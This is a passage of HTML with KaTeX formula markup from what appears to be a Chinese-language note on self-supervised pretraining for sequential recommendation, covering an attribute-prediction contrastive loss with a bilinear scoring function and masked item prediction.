display=\"block\"><semantics><mrow><msub><mi>L</mi><mrow><mi>A</mi><mi>A</mi><mi>P</mi></mrow></msub><mo stretchy=\"false\">(</mo><mi>i</mi><mo separator=\"true\">,</mo><msub><mi mathvariant=\"script\">H</mi><mi>i</mi></msub><mo stretchy=\"false\">)</mo><mo>=</mo><msub><mi mathvariant=\"double-struck\">E</mi><mrow><msub><mi>a</mi><mi>j</mi></msub><mo>∈</mo><msub><mi mathvariant=\"script\">H</mi><mi>i</mi></msub></mrow></msub><mo stretchy=\"false\">[</mo><mi>f</mi><mo stretchy=\"false\">(</mo><mi>i</mi><mo separator=\"true\">,</mo><msub><mi>a</mi><mi>j</mi></msub><mo stretchy=\"false\">)</mo><mo>−</mo><mi>log</mi><mo>⁡</mo><munder><mo>∑</mo><mrow><mover accent=\"true\"><mi>a</mi><mo>~</mo></mover><mo>∈</mo><mi mathvariant=\"script\">H</mi><mo>∖</mo><msub><mi mathvariant=\"script\">H</mi><mi>i</mi></msub></mrow></munder><mi>exp</mi><mo>⁡</mo><mo stretchy=\"false\">(</mo><mi>f</mi><mo stretchy=\"false\">(</mo><mi>i</mi><mo separator=\"true\">,</mo><mover accent=\"true\"><mi>a</mi><mo>~</mo></mover><mo stretchy=\"false\">)</mo><mo stretchy=\"false\">)</mo><mo stretchy=\"false\">]</mo></mrow><annotation encoding=\"application/x-tex\">L_{AAP}(i,\\mathcal{H}_{i})=\\mathbb{E}_{a_{j}\\in\\mathcal{H}_{i}}[f(i,a_{j})-\\log\\sum_{\\tilde{a}\\in\\mathcal{H}\\setminus\\mathcal{H}_{i}}\\exp(f(i,\\tilde{a}))]\n</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:1em;vertical-align:-0.25em;\"></span><span class=\"mord\"><span class=\"mord mathnormal\">L</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.32833099999999993em;\"><span style=\"top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mathnormal mtight\">A</span><span class=\"mord mathnormal mtight\">A</span><span class=\"mord mathnormal mtight\" style=\"margin-right:0.13889em;\">P</span></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span><span class=\"mopen\">(</span><span class=\"mord mathnormal\">i</span><span class=\"mpunct\">,</span><span class=\"mspace\" style=\"margin-right:0.16666666666666666em;\"></span><span class=\"mord\"><span class=\"mord\"><span class=\"mord mathcal\" style=\"margin-right:0.00965em;\">H</span></span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.31166399999999994em;\"><span style=\"top:-2.5500000000000003em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mathnormal mtight\">i</span></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span><span class=\"mclose\">)</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">=</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:1.0973199999999999em;vertical-align:-0.34731999999999996em;\"></span><span class=\"mord\"><span class=\"mord\"><span class=\"mord mathbb\">E</span></span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.32833100000000004em;\"><span style=\"top:-2.5500000000000003em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mtight\"><span class=\"mord mathnormal mtight\">a</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.3280857142857143em;\"><span style=\"top:-2.357em;margin-left:0em;margin-right:0.07142857142857144em;\"><span class=\"pstrut\" style=\"height:2.5em;\"></span><span class=\"sizing reset-size3 size1 mtight\"><span class=\"mord mtight\"><span class=\"mord mathnormal mtight\" style=\"margin-right:0.05724em;\">j</span></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.2818857142857143em;\"><span></span></span></span></span></span></span><span class=\"mrel mtight\">∈</span><span class=\"mord mtight\"><span class=\"mord mtight\"><span class=\"mord mathcal mtight\" style=\"margin-right:0.00965em;\">H</span></span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.3280857142857143em;\"><span style=\"top:-2.357em;margin-right:0.07142857142857144em;\"><span class=\"pstrut\" style=\"height:2.5em;\"></span><span class=\"sizing reset-size3 size1 mtight\"><span class=\"mord mtight\"><span class=\"mord mathnormal mtight\">i</span></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.143em;\"><span></span></span></span></span></span></span></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.34731999999999996em;\"><span></span></span></span></span></span></span><span class=\"mopen\">[</span><span class=\"mord mathnormal\" style=\"margin-right:0.10764em;\">f</span><span class=\"mopen\">(</span><span class=\"mord mathnormal\">i</span><span class=\"mpunct\">,</span><span class=\"mspace\" style=\"margin-right:0.16666666666666666em;\"></span><span class=\"mord\"><span class=\"mord mathnormal\">a</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.311664em;\"><span style=\"top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mathnormal mtight\" style=\"margin-right:0.05724em;\">j</span></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.286108em;\"><span></span></span></span></span></span></span><span class=\"mclose\">)</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mbin\">−</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:2.5660100000000003em;vertical-align:-1.516005em;\"></span><span class=\"mop\">lo<span style=\"margin-right:0.01389em;\">g</span></span><span class=\"mspace\" style=\"margin-right:0.16666666666666666em;\"></span><span class=\"mop op-limits\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:1.050005em;\"><span style=\"top:-1.808995em;margin-left:0em;\"><span class=\"pstrut\" style=\"height:3.05em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord accent mtight\"><span class=\"vlist-t\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.6678599999999999em;\"><span style=\"top:-2.7em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"mord mtight\"><span class=\"mord mathnormal mtight\">a</span></span></span><span style=\"top:-3.0500000000000003em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"accent-body\" style=\"left:-0.25em;\"><span class=\"mord mtight\">~</span></span></span></span></span></span></span><span class=\"mrel mtight\">∈</span><span class=\"mord mtight\"><span class=\"mord mathcal mtight\" style=\"margin-right:0.00965em;\">H</span></span><span class=\"mbin mtight\">∖</span><span class=\"mord mtight\"><span class=\"mord mtight\"><span class=\"mord mathcal mtight\" style=\"margin-right:0.00965em;\">H</span></span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.3280857142857143em;\"><span style=\"top:-2.357em;margin-right:0.07142857142857144em;\"><span class=\"pstrut\" style=\"height:2.5em;\"></span><span class=\"sizing reset-size3 size1 mtight\"><span class=\"mord mtight\"><span class=\"mord mathnormal mtight\">i</span></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.143em;\"><span></span></span></span></span></span></span></span></span></span><span style=\"top:-3.0500049999999996em;\"><span class=\"pstrut\" style=\"height:3.05em;\"></span><span><span class=\"mop op-symbol large-op\">∑</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:1.516005em;\"><span></span></span></span></span></span><span class=\"mspace\" style=\"margin-right:0.16666666666666666em;\"></span><span class=\"mop\">exp</span><span class=\"mopen\">(</span><span class=\"mord mathnormal\" style=\"margin-right:0.10764em;\">f</span><span class=\"mopen\">(</span><span class=\"mord mathnormal\">i</span><span class=\"mpunct\">,</span><span class=\"mspace\" style=\"margin-right:0.16666666666666666em;\"></span><span class=\"mord accent\"><span class=\"vlist-t\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.6678599999999999em;\"><span style=\"top:-3em;\"><span class=\"pstrut\" style=\"height:3em;\"></span><span class=\"mord\"><span class=\"mord mathnormal\">a</span></span></span><span style=\"top:-3.35em;\"><span class=\"pstrut\" style=\"height:3em;\"></span><span class=\"accent-body\" style=\"left:-0.25em;\"><span class=\"mord\">~</span></span></span></span></span></span></span><span class=\"mclose\">)</span><span class=\"mclose\">)</span><span class=\"mclose\">]</span></span></span></span></span></p>\n<ul>\n<li>\n<p>采用负属性<span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mover accent=\"true\"><mi>a</mi><mo>~</mo></mover></mrow><annotation encoding=\"application/x-tex\">\\tilde a</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.6678599999999999em;vertical-align:0em;\"></span><span class=\"mord accent\"><span class=\"vlist-t\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.6678599999999999em;\"><span style=\"top:-3em;\"><span class=\"pstrut\" style=\"height:3em;\"></span><span class=\"mord mathnormal\">a</span></span><span style=\"top:-3.35em;\"><span class=\"pstrut\" style=\"height:3em;\"></span><span class=\"accent-body\" style=\"left:-0.25em;\"><span class=\"mord\">~</span></span></span></span></span></span></span></span></span></span> 来增强项目<span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi>i</mi></mrow><annotation encoding=\"application/x-tex\">i</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.65952em;vertical-align:0em;\"></span><span class=\"mord mathnormal\">i</span></span></span></span> 与真实属性之间的关联</p>\n</li>\n<li>\n<p><code>\\</code>  是定义的集合减法运算</p>\n</li>\n<li>\n<p><span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi>f</mi><mo stretchy=\"false\">(</mo><mi mathvariant=\"normal\">.</mi><mo separator=\"true\">,</mo><mi mathvariant=\"normal\">.</mi><mo stretchy=\"false\">)</mo></mrow><annotation encoding=\"application/x-tex\">f(.,.)</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:1em;vertical-align:-0.25em;\"></span><span class=\"mord mathnormal\" style=\"margin-right:0.10764em;\">f</span><span class=\"mopen\">(</span><span class=\"mord\">.</span><span class=\"mpunct\">,</span><span class=\"mspace\" style=\"margin-right:0.16666666666666666em;\"></span><span class=\"mord\">.</span><span class=\"mclose\">)</span></span></span></span> 用一个简单的双线性网络实现:</p>\n<p><span class=\"katex-display\"><span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\" display=\"block\"><semantics><mrow><mi>f</mi><mo stretchy=\"false\">(</mo><mi>i</mi><mo separator=\"true\">,</mo><msub><mi>a</mi><mi>j</mi></msub><mo stretchy=\"false\">)</mo><mo>=</mo><mi>σ</mi><mo fence=\"false\">(</mo><msubsup><mi mathvariant=\"bold\">e</mi><mi>i</mi><mi mathvariant=\"normal\">⊤</mi></msubsup><mo>⋅</mo><msub><mi mathvariant=\"bold\">W</mi><mrow><mi>A</mi><mi>A</mi><mi>P</mi></mrow></msub><mo>⋅</mo><msub><mi mathvariant=\"bold\">e</mi><msub><mi>a</mi><mi>j</mi></msub></msub><mo fence=\"false\">)</mo><mo separator=\"true\">,</mo></mrow><annotation encoding=\"application/x-tex\">f(i,a_j)=\\sigma\\big(\\mathbf{e}_i^\\top\\cdot\\mathbf{W}_{AAP}\\cdot\\mathbf{e}_{a_j}\\big),\n</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:1.036108em;vertical-align:-0.286108em;\"></span><span class=\"mord mathnormal\" style=\"margin-right:0.10764em;\">f</span><span class=\"mopen\">(</span><span class=\"mord mathnormal\">i</span><span class=\"mpunct\">,</span><span class=\"mspace\" style=\"margin-right:0.16666666666666666em;\"></span><span class=\"mord\"><span class=\"mord mathnormal\">a</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.311664em;\"><span style=\"top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mathnormal mtight\" style=\"margin-right:0.05724em;\">j</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.286108em;\"><span></span></span></span></span></span></span><span class=\"mclose\">)</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">=</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:1.2491179999999997em;vertical-align:-0.35001em;\"></span><span class=\"mord mathnormal\" style=\"margin-right:0.03588em;\">σ</span><span class=\"mord\"><span class=\"delimsizing size1\">(</span></span><span class=\"mord\"><span class=\"mord\"><span class=\"mord mathbf\">e</span></span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.8991079999999998em;\"><span style=\"top:-2.4530000000000003em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mathnormal mtight\">i</span></span></span><span style=\"top:-3.113em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\">⊤</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.247em;\"><span></span></span></span></span></span></span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mbin\">⋅</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:0.83611em;vertical-align:-0.15em;\"></span><span class=\"mord\"><span class=\"mord\"><span class=\"mord mathbf\" style=\"margin-right:0.01597em;\">W</span></span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.32833099999999993em;\"><span style=\"top:-2.5500000000000003em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mathnormal mtight\">A</span><span class=\"mord mathnormal mtight\">A</span><span class=\"mord mathnormal mtight\" style=\"margin-right:0.13889em;\">P</span></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mbin\">⋅</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:1.20001em;vertical-align:-0.35001em;\"></span><span class=\"mord\"><span class=\"mord\"><span class=\"mord mathbf\">e</span></span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15139200000000003em;\"><span style=\"top:-2.5500000000000003em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mtight\"><span class=\"mord mathnormal mtight\">a</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.3280857142857143em;\"><span style=\"top:-2.357em;margin-left:0em;margin-right:0.07142857142857144em;\"><span class=\"pstrut\" style=\"height:2.5em;\"></span><span class=\"sizing reset-size3 size1 mtight\"><span class=\"mord mathnormal mtight\" style=\"margin-right:0.05724em;\">j</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.2818857142857143em;\"><span></span></span></span></span></span></span></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.34731999999999996em;\"><span></span></span></span></span></span></span><span class=\"mord\"><span class=\"delimsizing size1\">)</span></span><span class=\"mpunct\">,</span></span></span></span></span></p>\n<ul>\n<li><span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><msub><mi>W</mi><mrow><mi>A</mi><mi>A</mi><mi>P</mi></mrow></msub><mo>∈</mo><msup><mi mathvariant=\"script\">R</mi><mrow><mi>d</mi><mo>×</mo><mi>d</mi></mrow></msup></mrow><annotation encoding=\"application/x-tex\">W_{AAP} \\in \\mathcal R^{d \\times d}</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.83333em;vertical-align:-0.15em;\"></span><span class=\"mord\"><span class=\"mord mathnormal\" style=\"margin-right:0.13889em;\">W</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.32833099999999993em;\"><span style=\"top:-2.5500000000000003em;margin-left:-0.13889em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mathnormal mtight\">A</span><span class=\"mord mathnormal mtight\">A</span><span class=\"mord mathnormal mtight\" style=\"margin-right:0.13889em;\">P</span></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">∈</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:0.8491079999999999em;vertical-align:0em;\"></span><span class=\"mord\"><span class=\"mord mathcal\">R</span><span class=\"msupsub\"><span class=\"vlist-t\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.8491079999999999em;\"><span style=\"top:-3.063em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mathnormal mtight\">d</span><span class=\"mbin mtight\">×</span><span class=\"mord mathnormal mtight\">d</span></span></span></span></span></span></span></span></span></span></span></span> 是一个可学习矩阵</li>\n<li><span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi>σ</mi><mo stretchy=\"false\">(</mo><mi mathvariant=\"normal\">.</mi><mo stretchy=\"false\">)</mo></mrow><annotation encoding=\"application/x-tex\">\\sigma(.)</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:1em;vertical-align:-0.25em;\"></span><span class=\"mord mathnormal\" style=\"margin-right:0.03588em;\">σ</span><span class=\"mopen\">(</span><span class=\"mord\">.</span><span class=\"mclose\">)</span></span></span></span> 是<strong> sigmoid</strong> 激活函数</li>\n</ul>\n</li>\n</ul>\n</li>\n</ul>\n<h3 id=\"序列项相关性建模\"><a class=\"anchor\" href=\"#序列项相关性建模\">#</a> 序列项相关性建模</h3>\n<ul>\n<li>\n<p>在每个训练步骤中，我们随机屏蔽输入序列中的一部分项目（即，用特殊标记 “[mask]” 替换它们）</p>\n</li>\n<li>\n<p>然后根据两个方向的周围上下文从原始序列中预测被掩盖的项目</p>\n</li>\n<li>\n<p>考虑的第二个损失是从输入序列中恢复具有双向上下文的实际项目</p>\n</li>\n<li>\n<p>基础模型的预训练版本是一个双向 Transformer 架构</p>\n</li>\n<li i_t=\"\">\n<p>在序列<span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mo stretchy=\"false\">{</mo><msub><mi>i</mi><mn>1</mn></msub><mo separator=\"true\">,</mo><mi mathvariant=\"normal\">.</mi><mi mathvariant=\"normal\">.</mi><mi mathvariant=\"normal\">.</mi><mo separator=\"true\">,</mo><msub><mi>i</mi><mi>t</mi></msub><mo separator=\"true\">,</mo><mi mathvariant=\"normal\">.</mi><mi mathvariant=\"normal\">.</mi><mi mathvariant=\"normal\">.</mi><mo separator=\"true\">,</mo><msub><mi>i</mi><mi>n</mi></msub><mo stretchy=\"false\">}</mo></mrow><annotation encoding=\"application/x-tex\">\\{i_1,...,i_t,...,i_n\\}</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:1em;vertical-align:-0.25em;\"></span><span class=\"mopen\">{</span><span class=\"mord\"><span class=\"mord mathnormal\">i</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.30110799999999993em;\"><span style=\"top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\">1</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span><span class=\"mpunct\">,</span><span class=\"mspace\" style=\"margin-right:0.16666666666666666em;\"></span><span class=\"mord\">.</span><span class=\"mord\">.</span><span class=\"mord\">.</span><span class=\"mpunct\">,</span><span class=\"mspace\" style=\"margin-right:0.16666666666666666em;\"></span><span class=\"mord\"><span class=\"mord mathnormal\">i</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.2805559999999999em;\"><span style=\"top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mathnormal mtight\">t</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span><span class=\"mpunct\">,</span><span class=\"mspace\" style=\"margin-right:0.16666666666666666em;\"></span><span class=\"mord\">.</span><span class=\"mord\">.</span><span class=\"mord\">.</span><span class=\"mpunct\">,</span><span class=\"mspace\" style=\"margin-right:0.16666666666666666em;\"></span><span class=\"mord\"><span class=\"mord mathnormal\">i</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.151392em;\"><span style=\"top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mathnormal mtight\">n</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span><span class=\"mclose\">}</span></span></span></span> 中屏蔽第<span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi>t</mi></mrow><annotation encoding=\"application/x-tex\">t</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.61508em;vertical-align:0em;\"></span><span class=\"mord mathnormal\">t</span></span></span></span> 个项目<span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><msub><mi>i</mi><mi>t</mi></msub></mrow><annotation encoding=\"application/x-tex\">i_t</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.80952em;vertical-align:-0.15em;\"></span><span class=\"mord\"><span class=\"mord mathnormal\">i</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.2805559999999999em;\"><span style=\"top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mathnormal mtight\">t</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span></span></span></span>，将其余序列<span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><msub><mi>i</mi><mn>1</mn></msub><mo separator=\"true\">,</mo><mi mathvariant=\"normal\">.</mi><mi mathvariant=\"normal\">.</mi><mi mathvariant=\"normal\">.</mi><mo separator=\"true\">,</mo><mi>m</mi><mi>a</mi><mi>s</mi><mi>k</mi><mo separator=\"true\">,</mo><mi mathvariant=\"normal\">.</mi><mi mathvariant=\"normal\">.</mi><mi mathvariant=\"normal\">.</mi><mo separator=\"true\">,</mo><msub><mi>i</mi><mi>n</mi></msub></mrow><annotation encoding=\"application/x-tex\">{i_1,...,mask,...,i_n}</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.8888799999999999em;vertical-align:-0.19444em;\"></span><span class=\"mord\"><span class=\"mord\"><span class=\"mord mathnormal\">i</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.30110799999999993em;\"><span style=\"top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\">1</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span><span class=\"mpunct\">,</span><span class=\"mspace\" style=\"margin-right:0.16666666666666666em;\"></span><span class=\"mord\">.</span><span class=\"mord\">.</span><span class=\"mord\">.</span><span class=\"mpunct\">,</span><span class=\"mspace\" style=\"margin-right:0.16666666666666666em;\"></span><span class=\"mord mathnormal\">m</span><span class=\"mord mathnormal\">a</span><span class=\"mord mathnormal\">s</span><span class=\"mord mathnormal\" style=\"margin-right:0.03148em;\">k</span><span class=\"mpunct\">,</span><span class=\"mspace\" style=\"margin-right:0.16666666666666666em;\"></span><span class=\"mord\">.</span><span class=\"mord\">.</span><span class=\"mord\">.</span><span class=\"mpunct\">,</span><span class=\"mspace\" style=\"margin-right:0.16666666666666666em;\"></span><span class=\"mord\"><span class=\"mord mathnormal\">i</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.151392em;\"><span style=\"top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mathnormal mtight\">n</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span></span></span></span></span> 视为其周围的上下文，表示为\\mathcal C_</p>\n</li>\n<li>\n<p>当我们给定<span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><msub><mi mathvariant=\"script\">C</mi><msub><mi>i</mi><mi>t</mi></msub></msub></mrow><annotation encoding=\"application/x-tex\">\\mathcal C_{i_t}</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.93343em;vertical-align:-0.2501em;\"></span><span class=\"mord\"><span class=\"mord mathcal\" style=\"margin-right:0.05834em;\">C</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.31166399999999994em;\"><span style=\"top:-2.5500000000000003em;margin-left:-0.05834em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mtight\"><span class=\"mord mathnormal mtight\">i</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span 